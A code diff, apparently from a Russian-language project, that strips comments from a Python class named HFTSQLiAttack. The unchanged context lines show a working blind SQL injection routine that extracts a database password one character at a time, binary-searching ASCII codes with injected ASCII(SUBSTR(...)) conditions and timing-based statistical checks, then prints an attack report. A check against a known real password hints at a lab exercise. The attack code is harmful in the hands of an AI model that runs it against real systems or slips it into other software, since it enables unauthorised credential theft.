@@ -136,14 +136,14 @@ class HFTSQLiAttack:
         
         print(f"  Позиция {position:2d}: ", end='', flush=True)
         
-        # Используем бинарный поиск по ASCII
+       
         low, high = 32, 126
         found_char = None
         
         while low <= high:
             mid = (low + high) // 2
             
-            # Проверяем "ASCII код >= mid"
+           
             condition_ge = f"ASCII(SUBSTR({query}, {position}, 1)) >= {mid}"
             
             if self.test_condition_statistical(condition_ge, samples=5):
@@ -284,7 +284,7 @@ class HFTSQLiAttack:
             print("  Использую стандартную длину: 16 символов")
             length = 16
         
-        # Извлечение пароля
+        
         print(f"\n Извлечение пароля ({length} символов)...")
         password_chars = []
         
@@ -303,7 +303,7 @@ class HFTSQLiAttack:
         self.attack_market_conditions()
         self.attack_trade_execution()
         
-        # Проверка результата
+       
         print(f"\n Проверка извлеченного пароля...")
         if self.real_password:
             if password == self.real_password:
@@ -314,7 +314,7 @@ class HFTSQLiAttack:
         else:
             print(f"  Извлеченный пароль: '{password}'")
         
-        # Отчет
+       
         total_time = time.time() - self.start_time
         print("\n" + "="*80)
         print(" ОТЧЕТ ОБ HFT АТАКЕ")
@@ -344,7 +344,7 @@ class HFTSQLiAttack:
         return password
 
 def main():
-    """Основная функция для запуска HFT атаки"""
+   
     import sys
     
     if len(sys.argv) > 1:
